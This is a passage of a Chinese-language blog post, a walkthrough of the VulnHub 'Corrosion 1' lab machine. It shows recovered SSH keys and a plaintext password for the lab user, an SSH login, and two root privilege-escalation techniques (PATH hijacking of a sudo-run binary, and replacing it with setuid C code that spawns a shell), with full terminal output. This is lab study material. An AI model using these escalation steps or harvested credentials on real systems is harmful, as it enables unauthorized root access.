class="hljs-symbol">/gh4CoyUEW40KEd9BHCFB6GLdj4LKeHjFSd6w</span><br><span class="hljs-number">98</span>UAn<span class="hljs-operator">+</span>oP<span class="hljs-operator">+</span>iql<span class="hljs-operator">+</span><span class="hljs-number">8</span>acIKlFAA0t4<span class="hljs-operator">+</span>k9h5spiZ0lvgpynjHz7q0nUXfGttH6U1oOrs6dJ8rCh2<br><span class="hljs-number">9</span>lQvbXvJRXfXYOvaysI4VZBwkH0qOV0LjDrYvSMLzgkZ1W8GhWhYd<span class="hljs-operator">+</span>bM7Pt4VYx7J<span class="hljs-symbol">/M2xz</span><br>j4OKTmD7O8aa<span class="hljs-symbol">/33xhlBpJw9nHqVrXxnB4b7GLDEXFW9X8V+263j1fSHKlvga44U4Ux400R</span><br>o2Ubf7Xt9AHB08B0WcLFXGpf5srUB5lsL9BPqDMChjBJSckbeXOrSKzm9RA6r6KQBR<span class="hljs-operator">+</span>QAA<br>AMB3xUZMZYy8z8FoRBY0Tp<span class="hljs-operator">+</span>IDu0AVPZE3zg8AWksguA0cGHz0<span class="hljs-operator">+</span><span class="hljs-symbol">/mN+vkJpSm2Cm5JI3ToJ</span><br>sc178uN5w4W2YDsEoPniVRoXV<span class="hljs-symbol">/4PJSVaC6ZN9Pk5WwwxvHuDBkuf3Y3J3wOUSMXhIb8QYo</span><br>hM5bSQOzdKDwTr9Mrz3eF2wu4olU50Ag4MYaYk2bkOux7HB02uikgjRjo<span class="hljs-operator">+</span>CNyTw5ra8elG<br>bT5UfCNfiFWTApC5mz0z57gfq7uNwdmA9OOG3iRA7MDk<span class="hljs-operator">+</span><span class="hljs-number">61</span>CQAAADBAPacSdrgYiwbpKFU<br>XyrNHIcP6lQrzbRspQpQckz5ncPfhy7EVluB9hFwpjoNXg0kah8nKOd09QHHfGs7WRAVRi<br>VO6aXZ3s<span class="hljs-symbol">/wA3OhH8BsFXLdfTm8bB4kujD7cWSO0yuP4rLbEfWmkVdnUEAucmRPfopaXQY3</span><br><span class="hljs-symbol">/0InQjtZghzUpm5n2uih1i6NK9XVorljeifmJEWyHzGQk/stkUuBSxa382JNLnS81SomHW</span><br>JX<span class="hljs-operator">+</span><span class="hljs-number">5</span>wBHL6NY<span class="hljs-symbol">/fBvPiodsLaOnMJTm/1OwAAAMEA6Q+jz/8akC7NnRR6WLLfJXGEVK0mSAyT</span><br>TzXBAG3BIlkPMP463lm<span class="hljs-operator">+</span>SCTQnhgj1AXq64ozVS1PbYBkVMCaS0dAbWGU1fWYCBy9Qdd0eK<br>NLZrlsGWyW19y6EBZRrrQYpFTddMrXiz226<span class="hljs-operator">+</span>ooubeMFqY0<span class="hljs-symbol">/2zB8JRE4e2s3+JGQmWtQ9Pk</span><br>wbzWGscf7w1YmG7LvV1U45JAoOfUhoLSy8OkZLoKJ7NMJWYASj<span class="hljs-symbol">/dVa3X2EvBsFWPYkVJnu</span><br>WWR6gS<span class="hljs-operator">/</span>pLqQ5rfAAAACXJhbmR5QHRvcgE<span class="hljs-operator">=</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><em>id_rsa.pub</em> （公钥）</li>
+</ul>
+<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs swift">ssh<span class="hljs-operator">-</span>rsa <span class="hljs-type">AAAAB3NzaC1yc2EAAAADAQABAAABgQDgg1AuazHZFTVcL5aXj3WSF8aE60aAPEm0SmKgpBjUryBjuBgRxjBK</span><span class="hljs-regexp">/2WSxsZArZ32R6kZG6DQ+KxbSFm2ZNdHB2C87W5FwnMO3nyIcTSLK6vYQHSHnRmcPUqEMNEyhcyilW1cj3pl1PQRgY1JE5U/</span>5FF3KQEVlRCc1YIMobhhXtvuh27dwN8<span class="hljs-operator">+</span><span class="hljs-type">Fn0</span><span class="hljs-regexp">/KoWbr/</span>aUJB05F6k1Tl2SH9UiHZTAHR3kpJjMgf40NDwguhY7NvleJbIurkGoo8i6fb<span class="hljs-operator">+</span><span class="hljs-type">CTdku7djDFgsScbq7wttEJh2JvxMN</span><span class="hljs-regexp">/4LrrC2riFtIptvscbiko75Lqx8+8WMopHYPhVuooqBIVioO/</span>g8rwgPnyAesaRX899fiUP<span class="hljs-operator">+</span>dqDSPZLWjSWUxHT<span class="hljs-operator">+</span><span class="hljs-type">CZLxyJmq9YdPWNUYdV7GsbSnbm38TCcshtQ2sUlg9T1A</span><span class="hljs-operator">+</span>rQTohTHpLvkTpz1y3BRZOD9kmqNduw6Ifjc3SOvbqkv6VvdWQkvdH0ZqktN84WhkFeFy6ZjQaKP07InkuPXqx57CppARZcl9HGU<span class="hljs-operator">=</span> randy<span class="hljs-meta">@tor</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><em>my_password.txt</em> （文本文档）</li>
+</ul>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">randylovesgoldfish1998<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+
+
+
+
+<p><strong>估计就是randy的密码，我们直接ssh登录它</strong></p>
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+<p><strong>越权登录：</strong></p>
+<img src="/2025/05/26/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E5%A4%A9%E4%B9%8Bvulnhub-Corrosion-1/15.jpg" srcset="/img/loading.gif" lazyload class="image.jpg">
+
+<p>继续上面的常规信息收集，最后发现在sudo -l，可以root用户不过要密码操作<code>/home/randy/tools/easysysinfo</code>文件</p>
+<img src="/2025/05/26/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E5%A4%A9%E4%B9%8Bvulnhub-Corrosion-1/16.jpg" srcset="/img/loading.gif" lazyload class="image.jpg">
+
+
+
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+
+
+
+
+
+
+<p><strong>提权：</strong></p>
+<ul>
+<li><p>环境变量提权：（由于发现<code>/home/randy/tools/easysysinfo</code>文件具有s，也就是SUID权限）</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs shell">randy@corrosion:~$ echo &#x27;/bin/bash&#x27; &gt; /tmp/cat<br><br>randy@corrosion:~$ chmod +x /tmp/cat<br><br>randy@corrosion:~$ echo $PATH<br>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin<br><br>randy@corrosion:~$ export PATH=/tmp:$PATH<br><br>randy@corrosion:~$ echo $PATH<br>/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin<br><br>randy@corrosion:~$ sudo /home/randy/tools/easysysinfo<br>Tue Nov 14 11:19:38 AM MST 2023<br>127.0.0.1       localhost<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">The following lines are desirable <span class="hljs-keyword">for</span> IPv6 capable hosts</span><br>::1     ip6-localhost ip6-loopback<br>fe00::0 ip6-localnet<br>ff00::0 ip6-mcastprefix<br>ff02::1 ip6-allnodes<br>ff02::2 ip6-allrouters<br>Linux corrosion 5.11.0-25-generic #27-Ubuntu SMP Fri Jul 9 23:06:29 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux<br><br>randy@corrosion:~/tools$ /home/randy/tools/easysysinfo<br>Tue Nov 14 07:15:29 AM MST 2023<br><br>root@corrosion:~/tools#<br></code></pre></td></tr></table></figure></li>
+</ul>
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+
+
+<ul>
+<li><p>SUDO提权：（修改&#x2F; 覆盖文件提权）</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs shell">randy@corrosion:~/tools$ tee easysysinfo.c &lt;&lt;-&#x27;EOF&#x27;<br><span class="hljs-meta prompt_">#</span><span class="language-bash">include &lt;unistd.h&gt;</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">include &lt;stdlib.h&gt;</span><br>void main()<br>&#123; setuid(0);<br>  setgid(0);<br>  system(&quot;/bin/bash -i&quot;);<br>&#125;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">&gt; </span><span class="language-bash">EOF</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">include &lt;unistd.h&gt;</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">include &lt;stdlib.h&gt;</span><br>void main()<br>&#123; setuid(0);<br>  setgid(0);<br>  system(&quot;/bin/bash -i&quot;);<br>&#125;<br><br>randy@corrosion:~/tools$ gcc -o easysysinfo easysysinfo.c<br><br>randy@corrosion:~/tools$ ls -al<br>total 32<br>drwxrwxr-x  2 randy randy  4096 Nov 14 11:44 .<br>drwxr-x--- 17 randy randy  4096 Jul 30  2021 ..<br>-rwxrwxr-x  1 randy randy 16192 Nov 14 11:44 easysysinfo<br>-rw-rw-r--  1 randy randy   106 Nov 14 11:44 easysysinfo.c<br>-rwxr-xr-x  1 root  root    318 Jul 29  2021 easysysinfo.py<br><br>randy@corrosion:~/tools$ /home/randy/tools/easysysinfo<br><br>randy@corrosion:~/tools$ sudo /home/randy/tools/easysysinfo<br>[sudo] password for randy: <br><br>root@corrosion:/home/randy/tools# cd /root<br>root@corrosion:~# ls -al<br>total 52<br>drwx------  7 root root 4096 Jul 30  2021 .<br>drwxr-xr-x 20 root root 4096 Jul 29  2021 ..<br>-rw-r--r--  1 root root  461 Jul 30  2021 .bash_history<br>-rw-r--r--  1 root root 3106 Aug 14  2019 .bashrc<br>drwx------  2 root root 4096 Apr 20  2021 .cache<br>drwx------  3 root root 4096 Jul 30  2021 .config<br>drwxr-xr-x  2 root root 4096 Jul 30  2021 creds<br>drwxr-xr-x  3 root root 4096 Jul 29  2021 .local<br>-rw-r--r--  1 root root   10 Nov 14 11:46 logs.txt<br>-rw-r--r--  1 root root  161 Sep 16  2020 .profile<br>-rw-r--r--  1 root root  251 Jul 30  2021 root.txt<br>-rw-r--r--  1 root root   66 Jul 30  2021 .selected_editor<br>drwxr-xr-x  3 root root 4096 Jul 29  2021 snap<br>-rw-r--r--  1 root root    0 Jul 30  2021 .sudo_as_admin_successful<br><br>root@corrosion:~# cat root.txt<br>FLAG: 4NJSA99SD7922197D7S90PLAWE <br><br>Congrats! Hope you enjoyed my first machine posted on VulnHub! <br>Ping me on twitter @proxyprgrammer for any suggestions.<br><br>Youtube: https://www.youtube.com/c/ProxyProgrammer<br>Twitter: https://twitter.com/proxyprgrammer<br><br>root@corrosion:~#<br></code></pre></td></tr></table></figure></li>
+</ul>
+<br/>
+
+<br/>
+
+
+
+
+<p>至此靶场结束通关，还是挺好玩的</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/vulnhub/" class="category-chain-item">vulnhub</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%8E%9F%E5%88%9B/" class="print-no-link">#原创</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>励志学习第一天之vulnhub-Corrosion-1</div>
+      <div>http://example.com/2025/05/26/励志学习第一天之vulnhub-Corrosion-1/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Achernar</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年5月26日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/05/27/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%BA%8C%E5%A4%A9%E4%B9%8Bvulnhub-Corrosion-2/" title="励志学习第二天之vulnhub-Corrosion-2">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">励志学习第二天之vulnhub-Corrosion-2</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"Nlnb8Qk84Y149g92eAYi98fl-gzGzoHsz","appKey":"4Bb0mDjXB8MftPeL9yNfjBgO","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量
+        <span id="busuanzi_value_site_pv"></span>
+        次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数
+        <span id="busuanzi_value_site_uv"></span>
+        人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
